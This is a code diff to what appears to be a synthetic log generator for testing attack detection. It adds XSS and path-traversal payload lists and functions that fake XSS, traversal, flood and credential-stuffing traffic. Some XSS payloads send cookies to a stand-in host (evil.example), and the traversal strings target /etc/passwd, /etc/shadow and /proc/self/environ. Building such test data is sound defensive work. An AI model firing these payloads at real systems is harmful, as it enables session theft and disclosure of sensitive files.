@@ -37,6 +37,32 @@ SENSITIVE_PATHS = [
     "/phpmyadmin", "/server-status", "/debug", "/api/v1/admin/export",
 ]
 
+XSS_PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert(document.cookie)>",
+    "javascript:alert('XSS')",
+    "<svg onload=fetch('//evil.example/'+document.cookie)>",
+    "<iframe src=javascript:alert(1)>",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<body onload=alert('XSS')>",
+    "eval(atob('YWxlcnQoMSk='))",
+    "\"><script>document.location='http://evil.example/?c='+document.cookie</script>",
+]
+
+PATH_TRAVERSAL_PAYLOADS = [
+    "../../../../etc/passwd",
+    "../../../etc/shadow",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "....//....//....//etc/passwd",
+    "../../../windows/system32/drivers/etc/hosts",
+    "../../../../proc/self/environ",
+    "../../../boot.ini",
+    "%252e%252e%252fetc%252fpasswd",
+    "..\\..\\..\\windows\\win.ini",
+]
+
 SQL_INJECTION_PAYLOADS = [
     "' OR 1=1 --",
     "' UNION SELECT username, password FROM users --",
@@ -186,6 +212,97 @@ def generate_suspicious_ip_logs(base_time: datetime = None, count: int = None):
     return logs
 
 
+def generate_xss_logs(base_time: datetime = None, count: int = None):
+    """Generate requests containing XSS payloads."""
+    if count is None:
+        count = random.randint(2, 6)
+    attacker_ip = random.choice(SUSPICIOUS_IPS)
+    logs = []
+    for _ in range(count):
+        payload = random.choice(XSS_PAYLOADS)
+        base_path = random.choice(["/search?q=", "/comment?text=", "/profile?name=", "/api/v1/messages?body="])
+        logs.append({
+            "timestamp": _random_timestamp(base_time, spread_seconds=120),
+            "ip": attacker_ip,
+            "method": random.choice(["GET", "POST"]),
+            "path": base_path + payload,
+            "status_code": random.choice([200, 200, 400, 500]),
+            "user_agent": random.choice(USER_AGENTS + MALICIOUS_USER_AGENTS),
+            "user": None,
+        })
+    return logs
+
+
+def generate_path_traversal_logs(base_time: datetime = None, count: int = None):
+    """Generate requests containing path traversal payloads."""
+    if count is None:
+        count = random.randint(2, 5)
+    attacker_ip = random.choice(SUSPICIOUS_IPS)
+    logs = []
+    for _ in range(count):
+        payload = random.choice(PATH_TRAVERSAL_PAYLOADS)
+        base_path = random.choice(["/download?file=", "/read?path=", "/static/", "/api/v1/file?name="])
+        logs.append({
+            "timestamp": _random_timestamp(base_time, spread_seconds=90),
+            "ip": attacker_ip,
+            "method": "GET",
+            "path": base_path + payload,
+            "status_code": random.choice([200, 403, 404, 500]),
+            "user_agent": random.choice(MALICIOUS_USER_AGENTS + USER_AGENTS[:3]),
+            "user": None,
+        })
+    return logs
+
+
+def generate_rate_flood_logs(base_time: datetime = None, count: int = None):
+    """Generate a flood of rapid requests from a single IP (DoS simulation)."""
+    if count is None:
+        count = random.randint(25, 60)
+    attacker_ip = random.choice(SUSPICIOUS_IPS)
+    timestamps = _rapid_timestamps(count, base_time, window_seconds=10)
+    target_paths = random.choices(NORMAL_PATHS + SENSITIVE_PATHS, k=count)
+    logs = []
+    for ts, path in zip(timestamps, target_paths):
+        logs.append({
+            "timestamp": ts,
+            "ip": attacker_ip,
+            "method": random.choice(["GET", "GET", "GET", "POST"]),
+            "path": path,
+            "status_code": random.choice([200, 200, 429, 503]),
+            "user_agent": random.choice(USER_AGENTS + MALICIOUS_USER_AGENTS),
+            "user": None,
+        })
+    return logs
+
+
+def generate_credential_stuffing_logs(base_time: datetime = None, count: int = None):
+    """Generate login attempts with many different usernames (credential stuffing)."""
+    if count is None:
+        count = random.randint(8, 18)
+    attacker_ip = random.choice(SUSPICIOUS_IPS)
+    # Use a large pool of usernames to simulate a stuffing list
+    stuffing_users = NORMAL_USERS + ADMIN_USERS + [
+        "john.doe", "jane.smith", "mike_93", "user123", "test_user",
+        "support", "service", "operator", "manager", "helpdesk",
+    ]
+    timestamps = _rapid_timestamps(count, base_time, window_seconds=45)
+    logs = []
+    for ts in timestamps:
+        user = random.choice(stuffing_users)
+        # Rarely let one succeed
+        status = 200 if random.random() < 0.05 else 401
+        logs.append({
+            "timestamp": ts,
+            "ip": attacker_ip,
+            "method": "POST",
+            "path": random.choice(["/login", "/api/v1/auth/login", "/auth/signin"]),
+            "status_code": status,
+            "user_agent": random.choice(USER_AGENTS),
+            "user": user,
+        })
+    return logs
+
+
 def generate_log_batch(count: int = 50, attack_ratio: float = 0.3):
     """
     Generate a mixed batch of logs: normal traffic + attack patterns.
@@ -210,6 +327,10 @@ def generate_log_batch(count: int = 50, attack_ratio: float = 0.3):
         generate_sql_injection_logs,
         generate_unauthorized_access_logs,
         generate_suspicious_ip_logs,
+        generate_xss_logs,
+        generate_path_traversal_logs,
+        generate_rate_flood_logs,
+        generate_credential_stuffing_logs,
     ]
 
     remaining = attack_count
